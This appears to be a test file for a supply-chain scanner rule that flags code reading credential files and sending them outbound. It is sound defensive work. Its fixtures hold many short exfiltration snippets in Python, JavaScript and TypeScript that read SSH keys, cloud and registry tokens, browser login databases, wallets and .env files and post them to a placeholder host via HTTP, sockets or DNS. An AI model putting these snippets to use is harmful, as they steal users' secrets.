"""A credential file's contents reaching an outbound send is a critical finding.

Reading ``~/.ssh/id_rsa`` / ``~/.aws/credentials`` / ``~/.npmrc`` … and posting it
produced no finding at all before ``src/scanner/credential_flow.py``: the read and the
send sit on different lines and the send names an ordinary variable. Precision: a read
that only feeds an SDK / auth client, or goes to the credential's own official host,
stays quiet.
"""
from __future__ import annotations

import pytest

from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file
from src.scanner.artifact_scan import scan_artifact_files
from src.scanner.credential_flow import credential_exfil_hits, credential_kind
from src.scanner.scan import _scan_content

NAME = "Credential file read sent outbound"


def _artifact(files: dict[str, str], eco: str = "pypi"):
    fetched = ArtifactFetchResult(ecosystem=eco, name="evilpkg", version="1", kind="sdist"
                                  if eco == "pypi" else "tarball", ok=True)
    for p, body in files.items():
        fetched.files[p] = _make_file(p, body.encode())
    findings, _n, _h = scan_artifact_files(fetched)
    return findings


def _cred(findings):
    return [f for f in findings if f.name == NAME]


PY = "import os, requests\nfrom pathlib import Path\n"
JS = ("const fs = require('fs');\nconst os = require('os');\n"
      "const path = require('path');\n")

# The three shapes from the report: each produced nothing on main.
REPORTED = [
    "import os,requests\nk=open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
    "requests.post('https://x.example.test',data=k)\n",
    "import os,requests\nk=open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "requests.post('https://x.example.test',data=k)\n",
    "import os,requests\nk=open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "requests.post('https://x.example.test',data={'k':k})\n",
]

PY_RECALL = {
    # the path built three ways
    "expanduser": PY + "k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                       "requests.post('https://x.example.test', data=k)\n",
    "pathlib": PY + "k = (Path.home() / '.ssh' / 'id_rsa').read_text()\n"
                    "requests.post('https://x.example.test', data=k)\n",
    "join_home_env": PY + "p = os.path.join(os.environ['HOME'], '.aws', 'credentials')\n"
                          "with open(p) as f:\n    body = f.read()\n"
                          "requests.post('https://x.example.test', json={'c': body})\n",
    # inline, no variable
    "inline": PY + "requests.post('https://x.example.test', "
                   "data=open(os.path.expanduser('~/.netrc')).read())\n",
    # one function hop: a helper that sends its parameter / one that returns the file
    "hop_sink": PY + "def ship(d):\n    requests.post('https://x.example.test', data=d)\n\n"
                     "k = open(os.path.expanduser('~/.kube/config')).read()\nship(k)\n",
    "hop_source": PY + "def grab():\n"
                       "    return open(os.path.expanduser('~/.docker/config.json')).read()\n\n"
                       "def main():\n    c = grab()\n"
                       "    requests.post('https://x.example.test', data=c)\n",
    "method_hop": PY + "class C:\n    def _send(self, blob):\n"
                       "        requests.put('https://x.example.test', data=blob)\n\n"
                       "    def run(self):\n"
                       "        k = (Path.home() / '.config' / 'gcloud' / "
                       "'application_default_credentials.json').read_bytes()\n"
                       "        self._send(k)\n",
    # other sends
    "urllib": "import os, urllib.request\n"
              "d = open(os.path.expanduser('~/.config/gcloud/credentials.db'), 'rb').read()\n"
              "urllib.request.urlopen(urllib.request.Request('https://x.example.test', data=d))\n",
    "socket": "import os, socket\nk = open(os.path.expanduser('~/.pypirc')).read()\n"
              "s = socket.socket()\ns.connect(('x.example.test', 9))\ns.sendall(k.encode())\n",
    "dns": "import os, dns.resolver\nk = open(os.path.expanduser('~/.npmrc')).read()\n"
           "label = k.strip()[:60]\ndns.resolver.resolve(label + '.x.example.test', 'A')\n",
    "httpx_async": "import os, httpx\nasync def go():\n"
                   "    k = open(os.path.expanduser('~/.ssh/id_ed25519')).read()\n"
                   "    async with httpx.AsyncClient() as c:\n"
                   "        await c.post('https://x.example.test', content=k)\n",
    "aiohttp": "import os, aiohttp\nasync def go():\n"
               "    k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
               "    async with aiohttp.ClientSession() as s:\n"
               "        await s.post('https://x.example.test', data=k)\n",
    "http_client": "import os, http.client\n"
                   "k = open(os.path.expanduser('~/.aws/credentials')).read()\n"
                   "conn = http.client.HTTPSConnection('x.example.test')\n"
                   "conn.request('POST', '/', body=k)\n",
    "browser_db": "import os, sqlite3, requests\n"
                  "db = os.path.expanduser('~/Library/Application Support/Google/Chrome/"
                  "Default/Login Data')\nconn = sqlite3.connect(db)\n"
                  "rows = conn.execute('select * from logins').fetchall()\n"
                  "requests.post('https://x.example.test', json=rows)\n",
    "wallet": "import os, requests\n"
              "w = open(os.path.join(os.getenv('APPDATA'), 'Bitcoin', 'wallet.dat'), 'rb').read()\n"
              "requests.post('https://x.example.test', files={'w': w})\n",
    "dotenv_cwd": "import requests\nenv = open('.env').read()\n"
                  "requests.post('https://x.example.test', data=env)\n",
    "glob_dir": "import os, glob, requests\n"
                "for p in glob.glob(os.path.expanduser('~/.ssh/*')):\n"
                "    requests.post('https://x.example.test', data=open(p).read())\n",
    "configparser_body": "import os, configparser, requests\ncp = configparser.ConfigParser()\n"
                         "cp.read(os.path.expanduser('~/.aws/credentials'))\n"
                         "requests.post('https://x.example.test', "
                         "data=cp['default']['aws_secret_access_key'])\n",
    # an auth header to a literal third-party host is still the token leaving
    "auth_header_third_party": "import os, requests\n"
                               "tok = open(os.path.expanduser('~/.npmrc')).read()\n"
                               "requests.get('https://x.example.test', "
                               "headers={'Authorization': tok})\n",
}

JS_RECALL = {
    # the path built three ways
    "concat": JS + "const k = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');\n"
                   "fetch('https://x.example.test', { method: 'POST', body: k });\n",
    "path_join": JS + "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), "
                      "'utf8');\nfetch('https://x.example.test', { method: 'POST', body: k });\n",
    "template": JS + "const k = fs.readFileSync(`${os.homedir()}/.ssh/id_rsa`, 'utf8');\n"
                     "fetch('https://x.example.test', { method: 'POST', body: k });\n",
    # one function hop each way
    "hop_sink": JS + "function ship(d) {\n"
                     "  return fetch('https://x.example.test', { method: 'POST', body: d });\n"
                     "}\nconst k = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n"
                     "ship(k);\n",
    "hop_source": JS + "const grab = () => fs.readFileSync(`${os.homedir()}/.ssh/id_rsa`, "
                       "'utf8');\nasync function main() {\n  const data = grab();\n"
                       "  await fetch('https://x.example.test', "
                       "{ method: 'POST', body: JSON.stringify({ data }) });\n}\n",
    "callback": JS + "fs.readFile(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8', "
                     "(err, data) => {\n"
                     "  fetch('https://x.example.test', { method: 'POST', body: data });\n});\n",
    # other sends
    "axios": JS + "const axios = require('axios');\n"
                  "const k = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');\n"
                  "axios.post('https://x.example.test', { k });\n",
    "https_request": JS + "const https = require('https');\n"
                          "const k = fs.readFileSync(path.join(os.homedir(), '.kube', 'config'));\n"
                          "const req = https.request({ host: 'x.example.test', method: 'POST' });\n"
                          "req.write(k);\nreq.end();\n",
    "net": JS + "const net = require('net');\n"
                "const k = fs.readFileSync(path.join(os.homedir(), '.docker', 'config.json'));\n"
                "const s = net.connect(9, 'x.example.test');\ns.write(k);\n",
    "dns": JS + "const dns = require('dns');\n"
                "const k = fs.readFileSync(path.join(os.homedir(), '.netrc')).toString('hex');\n"
                "dns.resolve(k.slice(0, 60) + '.x.example.test', () => {});\n",
}

TS_RECALL = (
    "import { readFile } from 'fs/promises';\nimport { homedir } from 'os';\n"
    "import { join } from 'path';\nexport async function run(): Promise<void> {\n"
    "  const key = await readFile(join(homedir(), '.ssh', 'id_rsa'), 'utf8');\n"
    "  await fetch('https://x.example.test', { method: 'POST', body: key });\n}\n"
)


class TestRecall:
    @pytest.mark.parametrize("body", REPORTED)
    def test_reported_shapes_are_critical_in_a_package(self, body):
        f = _cred(_artifact({"evilpkg/core.py": body}))
        assert f and all(x.severity == "critical" for x in f), f
        assert f[0].line_number == 3 and f[0].category == "exfiltration"

    @pytest.mark.parametrize("body", REPORTED)
    def test_reported_shapes_are_critical_in_a_repo(self, body):
        findings, _p, _s = _scan_content(body, "evilpkg/core.py")
        f = _cred(findings)
        assert f and f[0].severity == "critical"

    @pytest.mark.parametrize("name", sorted(PY_RECALL))
    def test_python(self, name):
        f = _cred(_artifact({"evilpkg/core.py": PY_RECALL[name]}))
        assert f and f[0].severity == "critical", name

    @pytest.mark.parametrize("name", sorted(JS_RECALL))
    def test_javascript(self, name):
        f = _cred(_artifact({"package/index.js": JS_RECALL[name]}, "npm"))
        assert f and f[0].severity == "critical", name

    def test_typescript(self):
        f = _cred(_artifact({"package/src/run.ts": TS_RECALL}, "npm"))
        assert f and f[0].severity == "critical"

    @pytest.mark.parametrize("path,body,eco", [
        ("evilpkg/tests/test_util.py", PY_RECALL["expanduser"], "pypi"),
        ("evilpkg/tests/test_util.py", PY_RECALL["hop_sink"], "pypi"),
        ("package/test/util.js", JS_RECALL["path_join"], "npm"),
        ("package/test/util.js", JS_RECALL["hop_sink"], "npm"),
    ])
    def test_tests_dir_is_a_payload(self, path, body, eco):
        # #162: test / doc dirs are read for payloads only; this one keeps its severity.
        f = _cred(_artifact({path: body}, eco))
        assert f and f[0].severity == "critical" and f[0].payload, f


PRECISION = {
    # boto3-style: the credentials file feeds the SDK client, which signs requests.
    "boto_loader": ("python",
                    "import os, configparser, boto3\ncp = configparser.ConfigParser()\n"
                    "cp.read(os.path.expanduser('~/.aws/credentials'))\nsec = cp['default']\n"
                    "client = boto3.client('s3', aws_access_key_id=sec['aws_access_key_id'],\n"
                    "    aws_secret_access_key=sec['aws_secret_access_key'])\n"
                    "client.put_object(Bucket='b', Key='k', Body=b'x')\n"),
    # the AWS key goes to AWS
    "aws_official_host": ("python",
                          "import os, requests\n"
                          "k = open(os.path.expanduser('~/.aws/credentials')).read()\n"
                          "requests.post('https://sts.amazonaws.com/', data=sign(k))\n"),
    # twine-style: the .pypirc password authenticates the upload to PyPI
    "twine_pypi": ("python",
                   "import os, configparser, requests\ncp = configparser.RawConfigParser()\n"
                   "cp.read(os.path.expanduser('~/.pypirc'))\n"
                   "user, pw = cp.get('pypi', 'username'), cp.get('pypi', 'password')\n"
                   "requests.post('https://upload.pypi.org/legacy/', auth=(user, pw),\n"
                   "              files={'content': open('dist/x.whl', 'rb')})\n"),
    "twine_configured_repo": ("python",
                              "import os, configparser, requests\n"
                              "def upload(repo_url, dist):\n"
                              "    cp = configparser.RawConfigParser()\n"
                              "    cp.read(os.path.expanduser('~/.pypirc'))\n"
                              "    pw = cp.get('pypi', 'password')\n"
                              "    s = requests.Session()\n    s.auth = ('__token__', pw)\n"
                              "    return s.post(repo_url, files={'content': open(dist, 'rb')})\n"),
    # paramiko loads the key to authenticate an SSH session; nothing posts it
    "paramiko_key_file": ("python",
                          "import os, paramiko\nkey = paramiko.RSAKey.from_private_key_file(\n"
                          "    os.path.expanduser('~/.ssh/id_rsa'))\nc = paramiko.SSHClient()\n"
                          "c.connect('host', pkey=key)\n"
                          "chan = c.get_transport().open_session()\nchan.send('ls')\n"),
    "paramiko_key_text": ("python",
                          "import os, io, paramiko\n"
                          "data = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                          "key = paramiko.RSAKey.from_private_key(io.StringIO(data))\n"
                          "c = paramiko.SSHClient()\nc.connect('host', pkey=key)\n"),
    # a CLI that prints where the file lives
    "cli_prints_path": ("python",
                        "import os, sys, requests\n"
                        "print('credentials:', os.path.expanduser('~/.aws/credentials'))\n"
                        "requests.get('https://example.test/version')\nsys.exit(0)\n"),
    # npm tooling: the .npmrc token goes to the npm registry, or rides an auth header
    "npm_registry": ("javascript",
                     JS + "const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), "
                     "'utf8');\nconst token = /_authToken=(.*)/.exec(npmrc)[1];\n"
                     "fetch('https://registry.npmjs.org/-/whoami', "
                     "{ headers: { authorization: `Bearer ${token}` } });\n"),
    "npm_configured_registry": ("javascript",
                                JS + "function whoami(registry) {\n"
                                "  const npmrc = fs.readFileSync(path.join(os.homedir(), "
                                "'.npmrc'), 'utf8');\n  const token = parse(npmrc);\n"
                                "  return fetch(registry + '/-/whoami', "
                                "{ headers: { authorization: `Bearer ${token}` } });\n}\n"),
    # an unrelated post elsewhere in the file
    "unrelated_post": ("python",
                       "import os, requests\ndef a():\n"
                       "    data = open(os.path.expanduser('~/.netrc')).read()\n"
                       "    return parse(data)\n\ndef b(url, data):\n"
                       "    return requests.post(url, data=data)\n"),
    "public_files": ("python",
                     "import os, requests\n"
                     "k = open(os.path.expanduser('~/.ssh/id_rsa.pub')).read()\n"
                     "h = open(os.path.expanduser('~/.ssh/known_hosts')).read()\n"
                     "requests.post('https://x.example.test', data=k + h)\n"),
    "docstring_example": ("python",
                          'import requests\ndef f():\n    """Never do: requests.post(u, data=open('
                          'os.path.expanduser("~/.ssh/id_rsa")).read())"""\n'
                          '    return requests.post("https://x.example.test", data={})\n'),
    "method_named_fetch": ("javascript",
                           JS + "class Cache {\n  async fetch(key, opts = {}) {\n"
                           "    const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'));\n"
                           "    this.store.put(key, rc);\n  }\n}\n"),
}


class TestPrecision:
    @pytest.mark.parametrize("name", sorted(PRECISION))
    def test_no_credential_exfil(self, name):
        lang, body = PRECISION[name]
        assert credential_exfil_hits(body, lang) == [], name
        path, eco = (("pkg/core.py", "pypi") if lang == "python"
                     else ("package/index.js", "npm"))
        assert not _cred(_artifact({path: body}, eco)), name

    def test_read_with_no_send_is_unchanged(self):
        # No outbound send: no finding at all, as before this rule.
        body = "import os\nk = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nprint(len(k))\n"
        assert _artifact({"evilpkg/core.py": body}) == []
        findings, _p, _s = _scan_content(body, "evilpkg/core.py")
        assert findings == []

    def test_allowlisted(self):
        findings, _p, _s = _scan_content(REPORTED[0], "evilpkg/core.py",
                                         {("evilpkg/core.py", NAME)})
        assert not _cred(findings)


@pytest.mark.parametrize("path,kind", [
    ("~/.ssh/id_rsa", "ssh"), (".ssh/id_ed25519", "ssh"), ("~/.ssh", "ssh"),
    ("~/.ssh/known_hosts", None), ("~/.ssh/id_rsa.pub", None), ("~/.ssh/config", None),
    ("~/.aws/credentials", "aws"), ("~/.aws/config", None),
    ("~/.config/gcloud/credentials.db", "gcloud"), ("~/.kube/config", "kube"),
    ("~/.netrc", "netrc"), ("~/.git-credentials", "netrc"), ("~/.npmrc", "npmrc"),
    ("~/.pypirc", "pypirc"), ("~/.docker/config.json", "docker"),
    ("Google/Chrome/Default/Login Data", "browser"),
    ("Firefox/Profiles/x/cookies.sqlite", "browser"), ("Bitcoin/wallet.dat", "wallet"),
    (".env", "env"), ("~/.env", "env"), ("src/.envrc", None), ("README.md", None),
])
def test_credential_kind(path, kind):
    assert credential_kind(path) == kind
